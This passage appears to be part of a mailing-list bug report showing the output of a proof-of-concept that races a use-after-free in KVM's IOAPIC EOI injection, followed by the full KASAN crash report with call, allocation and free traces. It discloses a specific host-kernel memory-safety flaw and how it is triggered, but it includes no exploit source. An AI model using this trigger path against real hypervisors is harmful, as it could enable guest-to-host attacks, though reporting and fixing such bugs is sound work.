=3D10000 /bin/kvm-x86-poc
[*] IOAPIC eoi_inject UAF race: iters=3D100 nvcpu=3D64 base_sleep=3D10000us
[*] Needs a KASAN guest kernel to *observe* the UAF. Ctrl-C to stop.
[*] iter=3D0 armed=3D1 =C2=A0 [ =C2=A0 50.773111] =3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D
[ =C2=A0 50.775501] BUG: KASAN: slab-use-after-free in __kvm_irq_delivery_t=
o_apic_fast (arch/x86/kvm/lapic.c:1252) kvm
[ =C2=A0 50.778186] Read of size 8 at addr ff1100010a2906a0 by task kworker=
/3:1/47
[ =C2=A0 50.778450]
[ =C2=A0 50.779189] CPU: 3 UID: 0 PID: 47 Comm: kworker/3:1 Not tainted 7.2=
.0-rc1 #1 PREEMPT(lazy)
[ =C2=A0 50.779420] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIO=
S 1.16.2-debian-1.16.2-1 04/01/2014
[ =C2=A0 50.779572] Workqueue: events kvm_ioapic_eoi_inject_work [kvm]
[ =C2=A0 50.781876] Call Trace:
[ =C2=A0 50.781950]=C2=A0 <TASK>
[ =C2=A0 50.782031]=C2=A0 dump_stack_lvl (lib/dump_stack.c:94 (discriminato=
r 1) lib/dump_stack.c:120 (discriminator 1))
[ =C2=A0 50.782382]=C2=A0 print_report (mm/kasan/report.c:378 mm/kasan/repo=
rt.c:482)
[ =C2=A0 50.782441]=C2=A0 ? __virt_addr_valid (include/linux/mmzone.h:2119 =
include/linux/mmzone.h:2271 arch/x86/mm/physaddr.c:54)
[ =C2=A0 50.782489]=C2=A0 ? kasan_complete_mode_report_info (mm/kasan/repor=
t_generic.c:179)
[ =C2=A0 50.782541]=C2=A0 kasan_report (mm/kasan/report.c:595)
[ =C2=A0 50.782605]=C2=A0 ? __kvm_irq_delivery_to_apic_fast (arch/x86/kvm/l=
apic.c:1252) kvm
[ =C2=A0 50.784322]=C2=A0 ? __kvm_irq_delivery_to_apic_fast (arch/x86/kvm/l=
apic.c:1252) kvm
[ =C2=A0 50.786015]=C2=A0 __asan_load8 (mm/kasan/generic.c:194 mm/kasan/gen=
eric.c:273)
[ =C2=A0 50.786101] __kvm_irq_delivery_to_apic_fast (arch/x86/kvm/lapic.c:1=
252) kvm
[ =C2=A0 50.787814]=C2=A0 ? __pfx___kvm_irq_delivery_to_apic_fast (arch/x86=
/kvm/lapic.c:860) kvm
[ =C2=A0 50.789532]=C2=A0 ? ktime_get (kernel/time/timekeeping.c:438 kernel=
/time/timekeeping.c:455 kernel/time/timekeeping.c:973)
[ =C2=A0 50.789600]=C2=A0 ? lapic_next_event (arch/x86/include/asm/apic.h:4=
05 arch/x86/kernel/apic/apic.c:418)
[ =C2=A0 50.789649]=C2=A0 ? clockevents_program_event (kernel/time/clockeve=
nts.c:373)
[ =C2=A0 50.789704] __kvm_irq_delivery_to_apic (arch/x86/kvm/lapic.c:1347) =
kvm
[ =C2=A0 50.791399]=C2=A0 ? __kasan_check_write (mm/kasan/shadow.c:37)
[ =C2=A0 50.791449]=C2=A0 ? __update_load_avg_cfs_rq (kernel/sched/pelt.c:1=
47 kernel/sched/pelt.c:227 kernel/sched/pelt.c:323)
[ =C2=A0 50.791492]=C2=A0 ? cpuacct_charge (kernel/sched/cpuacct.c:46 (disc=
riminator 3) kernel/sched/cpuacct.c:343 (discriminator 3))
[ =C2=A0 50.791536]=C2=A0 ? __pfx___kvm_irq_delivery_to_apic (arch/x86/kvm/=
lapic.c:1265) kvm
[ =C2=A0 50.793217]=C2=A0 ? pick_eevdf (kernel/sched/fair.c:1148 (discrimin=
ator 1))
[ =C2=A0 50.793268]=C2=A0 ? rb_insert_color (include/linux/rbtree_augmented=
.h:204 lib/rbtree.c:81 lib/rbtree.c:215 lib/rbtree.c:436)
[ =C2=A0 50.793337] ioapic_service (arch/x86/kvm/lapic.h:130 arch/x86/kvm/i=
oapic.c:492) kvm
[ =C2=A0 50.795009]=C2=A0 ? __pfx_ioapic_service (arch/x86/kvm/ioapic.c:155=
) kvm
[ =C2=A0 50.796697]=C2=A0 ? __pfx__raw_spin_lock (??:?)
[ =C2=A0 50.796752] kvm_ioapic_eoi_inject_work (arch/x86/kvm/ioapic.c:533) =
kvm
[ =C2=A0 50.798437]=C2=A0 process_one_work (kernel/workqueue.c:3322)
[ =C2=A0 50.798505]=C2=A0 worker_thread (kernel/workqueue.c:3405 kernel/wor=
kqueue.c:3486)
[ =C2=A0 50.798560]=C2=A0 ? __pfx_worker_thread (kernel/workqueue.c:3680)
[ =C2=A0 50.798607]=C2=A0 kthread (kernel/kthread.c:436)
[ =C2=A0 50.798670]=C2=A0 ? __pfx_kthread (kernel/kthread.c:378)
[ =C2=A0 50.798709]=C2=A0 ret_from_fork (arch/x86/kernel/process.c:158)
[ =C2=A0 50.798753]=C2=A0 ? __pfx_ret_from_fork (arch/x86/kernel/process.c:=
510)
[ =C2=A0 50.798794]=C2=A0 ? __asan_storeN (mm/kasan/generic.c:288)
[ =C2=A0 50.798833]=C2=A0 ? __switch_to (include/linux/thread_info.h:142 ar=
ch/x86/kernel/process.h:17 arch/x86/kernel/process_64.c:676)
[ =C2=A0 50.798878]=C2=A0 ? __pfx_kthread (kernel/kthread.c:378)
[ =C2=A0 50.798920]=C2=A0 ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[ =C2=A0 50.799004]=C2=A0 </TASK>
[ =C2=A0 50.799081]
[ =C2=A0 50.803914] Allocated by task 109 on cpu 1 at 48.240120s:
[ =C2=A0 50.804161]=C2=A0 kasan_save_stack (mm/kasan/common.c:57)
[ =C2=A0 50.804408]=C2=A0 kasan_save_track (mm/kasan/common.c:78)
[ =C2=A0 50.804559]=C2=A0 kasan_save_alloc_info (mm/kasan/generic.c:570)
[ =C2=A0 50.804750]=C2=A0 __kasan_kmalloc (mm/kasan/common.c:398 mm/kasan/c=
ommon.c:415)
[ =C2=A0 50.804888]=C2=A0 __kmalloc_cache_noprof (include/linux/kasan.h:263=
 mm/slub.c:5515)
[ =C2=A0 50.805040] kvm_create_lapic (include/linux/slab.h:969 include/linu=
x/slab.h:1290 arch/x86/kvm/lapic.c:3111) kvm
[ =C2=A0 50.806856] kvm_arch_vcpu_create (arch/x86/kvm/x86.c:12793) kvm
[ =C2=A0 50.808719] kvm_vm_ioctl (arch/x86/kvm/../../../virt/kvm/kvm_main.c=
:4201 arch/x86/kvm/../../../virt/kvm/kvm_main.c:5159) kvm
[ =C2=A0 50.810483]=C2=A0 __x64_sys_ioctl (fs/ioctl.c:51 fs/ioctl.c:597 fs/=
ioctl.c:583 fs/ioctl.c:583)
[ =C2=A0 50.810670]=C2=A0 x64_sys_call (/root/kvm-tcg-v7.2-rc1/build-kasan-=
outline/./arch/x86/include/generated/asm/syscalls_64.h:17)
[ =C2=A0 50.810815]=C2=A0 do_syscall_64 (arch/x86/entry/syscall_64.c:63 arc=
h/x86/entry/syscall_64.c:94)
[ =C2=A0 50.810956]=C2=A0 entry_SYSCALL_64_after_hwframe (arch/x86/entry/en=
try_64.S:121)
[ =C2=A0 50.811144]
[ =C2=A0 50.811236] Freed by task 109 on cpu 2 at 50.771569s:
[ =C2=A0 50.811400]=C2=A0 kasan_save_stack (mm/kasan/common.c:57)
[ =C2=A0 50.811549]=C2=A0 kasan_save_track (mm/kasan/common.c:78)
[ =C2=A0 50.811711]=C2=A0 kasan_save_free_info (mm/kasan/generic.c:584)
[ =C2=A0 50.811868]=C2=A0 __kasan_slab_free (mm/kasan/common.c:253 mm/kasan=
/common.c:285)
[ =C2=A0 50.812020]=C2=A0 kfree (include/linux/kasan.h:235 mm/slub.c:2705 m=
m/slub.c:6405 mm/slub.c:6720)
[ =C2=A0 50.812144] kvm_free_lapic (arch/x86/kvm/lapic.c:2722) kvm
[ =C2=A0 50.813936] kvm_arch_vcpu_destroy (arch/x86/kvm/x86.c:12907) kvm
[ =C2=A0 50.815728] kvm_destroy_vcpus (arch/x86/kvm/../../../virt/kvm/kvm_m=
ain.c:468 arch/x86/kvm/../../../virt/kvm/kvm_main.c:488) kvm
[ =C2=A0 50.817491] kvm_arch_destroy_vm (arch/x86/kvm/x86.c:13459) kvm
[ =C2=A0 50.819274] kvm_put_kvm (arch/x86/kvm/../../../virt/kvm/kvm_main.c:=
1294 arch/x86/kvm/../../../virt/kvm/kvm_main.c:1331) kvm
[ =C2=A0 50.821024] kvm_vm_release (arch/x86/kvm/../../../virt/kvm/kvm_main=
.c:1354) kvm
[ =C2=A0 50.822798]=C2=A0 __fput (fs/file_table.c:512)
[ =C2=A0 50.822926]=C2=A0 fput_close_sync (fs/file_table.c:617)
[ =C2=A0 50.823068]=C2=A0 __x64_sys_close (fs/open.c:1511 fs/open.c:1496 fs=
/open.c:1496)
[ =C2=A0 50.823196]=C2=A0 x64_sys_call (/root/kvm-tcg-v7.2-rc1/build-kasan-=
outline/./arch/x86/include/generated/asm/syscalls_64.h:4)
[ =C2=A0 50.823338]=C2=A0 do_syscall_64 (arch/x86/entry/syscall_64.c:63 arc=
h/x86/entry/syscall_64.c:94)
[ =C2=A0 50.823466]=C2=A0 entry_SYSCALL_64_after_hwframe (arch/x86/entry/en=
try_64.S:121)
[ =C2=A0 50.823696]
[ =C2=A0 50.823804] The buggy address belongs to the object at ff1100010a29=
0600
[ =C2=A0 50.823804]=C2=A0 which belongs to the cache kmalloc-256 of size 25=
6
[ =C2=A0 50.824173] The buggy address is located 160 bytes inside of
[ =C2=A0 50.824173]=C2=A0 freed 256-byte region [ff1100010a290600, ff110001=
0a290700)
[ =C2=A0 50.824512]
[ =C2=A0 50.824655] The buggy address belongs to the physical page:
[ =C2=A0 50.825094] page: refcount:0 mapcount:0 mapping:0000000000000000 in=
dex:0x0 pfn:0x10a290
[ =C2=A0 50.825495] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_map=
ped:0 pincount:0
[ =C2=A0 50.825802] flags: 0x200000000000040(head|node=3D0|zone=3D2)
[ =C2=A0 50.826261] page_type: f5(slab)
[ =C2=A0 50.826617] raw: 0200000000000040 ff11000100038b40 dead000000000100=
 dead000000000122
[ =C2=A0 50.826842] raw: 0000000000000000 0000000000100010 00000000f5000000=
 0000000000000000
[ =C2=A0 50.827110] head: 0200000000000040 ff11000100038b40 dead00000000010=
0 dead000000000122
[ =C2=A0 50.827333] head: 0000000000000000 0000000000100010 00000000f500000=
0 0000000000000000
[ =C2=A0 50.827560] head: 0200000000000001 ffffffffffffff81 00000000fffffff=
f 00000000ffffffff
[ =C2=A0 50.827817] head: 0000000000000000 0000000000000000 00000000fffffff=
f 0000000000000000
[ =C2=A0 50.828041] page dumped because: kasan: bad access detected
[ =C2=A0 50.828208]
[ =C2=A0 50.828290] Memory state around the buggy address:
[ =C2=A0 50.828605]=C2=A0 ff1100010a290580: fc fc fc fc fc fc fc fc fc fc f=
c fc fc fc fc fc
[ =C2=A0 50.828859]=C2=A0 ff1100010a290600: fa fb fb fb fb fb fb fb fb fb f=
b fb fb fb fb fb
[ =C2=A0 50.829088] >ff1100010a290680: fb fb fb fb fb fb fb fb fb fb fb fb =
fb fb fb fb
[ =C2=A0 50.829309] =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 ^
[ =C2=A0 50.829487]=C2=A0 ff1100010a290700: fc fc fc fc fc fc fc fc fc fc f=
c fc fc fc fc fc
[ =C2=A0 50.829743]=C2=A0 ff1100010a290780: fc fc fc fc fc fc fc fc fc fc f=
c fc fc fc fc fc
[ =C2=A0 50.829955] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
[ =C2=A0 50.830725] Disabling lock debugging due to kernel taint
```
